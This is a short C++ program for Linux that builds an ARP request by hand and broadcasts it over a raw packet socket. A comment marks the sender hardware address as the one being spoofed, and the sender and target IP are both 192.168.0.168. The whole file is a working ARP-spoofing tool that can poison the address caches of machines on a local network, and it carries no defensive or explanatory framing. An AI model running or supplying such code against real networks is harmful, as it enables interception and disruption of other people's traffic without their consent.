#include <cstdio>
#include <cstdlib>
#include <cstring>           // memset

#include <sys/socket.h>      // socket
#include <linux/if_packet.h> // sockaddr_ll
#include <net/if.h>          // if_nametoindex
#include <sys/ioctl.h>       // ioctl
#include <errno.h>           // perror
#include <netinet/in.h>      // htons


#define ARP 0x0806
#define ARP_PACKET_LEN 28

const char *iface = "enp2s0";
const unsigned char broadcast[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

unsigned char* prepareArpPacket() {
    unsigned char *arp_packet = (unsigned char *)malloc(ARP_PACKET_LEN * sizeof(char));

    /*
     * prepare the ARP packet
     */

    // HTYPE: 0x0001 (ETHERNET)
    arp_packet[0] = 0x00;
    arp_packet[1] = 0x01;

    // PTYPE: 0x0800
    arp_packet[2] = 0x08;
    arp_packet[3] = 0x00;

    // HLEN: 0x06 (ETHERNET)
    arp_packet[4] = 0x06;

    // PLEN: 0x04 (IPv4)
    arp_packet[5] = 0x04;

    // OPERATION: 0x0001 (REQUEST)
    arp_packet[6] = 0x00;
    arp_packet[7] = 0x01;

    // SHA (THE ADDRESS TO BE SPOOFED)
    arp_packet[8] = 0x01;
    arp_packet[9] = 0x02;
    arp_packet[10] = 0x03;
    arp_packet[11] = 0x04;
    arp_packet[12] = 0x05;
    arp_packet[13] = 0x06;

    // SPA: 192.168.0.168
    arp_packet[14] = 192;
    arp_packet[15] = 168;
    arp_packet[16] = 0;
    arp_packet[17] = 168;

    // THA: 00:00:00:00:00:00
    arp_packet[18] = 0x00;
    arp_packet[19] = 0x00;
    arp_packet[20] = 0x00;
    arp_packet[21] = 0x00;
    arp_packet[22] = 0x00;
    arp_packet[23] = 0x00;

    // TPA (=SPA): 192.168.0.168
    arp_packet[24] = 192;
    arp_packet[25] = 168;
    arp_packet[26] = 0;
    arp_packet[27] = 168;

    return arp_packet;
}

int main(int argc, char **argv) {

    // create L2 raw socket
    int socketfd = socket(AF_PACKET, SOCK_DGRAM, htons(ARP));
    if (socketfd < 0) {
        perror("socket not created");
    } else {
        printf("socket created\n");
    }

    // get the arp_packet
    unsigned char *arp_packet = prepareArpPacket();

    // fill in the address to send the packet to
    sockaddr_ll dst;
    memset(&dst, 0, sizeof(sockaddr_ll));

    dst.sll_family = AF_PACKET;
    dst.sll_halen = 6;
    dst.sll_ifindex = if_nametoindex(iface);
    dst.sll_protocol = htons(ARP);
    memcpy(dst.sll_addr, broadcast, dst.sll_halen);

    // send packet
    if (sendto(socketfd, arp_packet, ARP_PACKET_LEN, 0,
               (const sockaddr *)&dst, sizeof(dst)) < 0) {
        perror("sendto failed");
    } else {
        printf("packet sent\n");
    }

    return 0;
}